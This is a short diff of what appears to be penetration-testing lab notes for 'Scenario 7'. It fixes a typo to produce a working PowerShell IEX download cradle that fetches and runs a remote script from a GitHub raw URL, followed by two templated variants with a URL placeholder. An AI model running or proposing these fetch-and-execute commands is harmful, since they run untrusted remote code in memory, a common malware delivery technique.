@@ -1,7 +1,7 @@
 
 
 //Scenario 7
-EX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Harsh-SC/PT02/refs/heads/main/Scenario07.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Harsh-SC/PT02/refs/heads/main/Scenario07.ps1')
 IEX (Invoke-WebRequest <URL>).Content
 IEX (iwr <URL>).Content
 
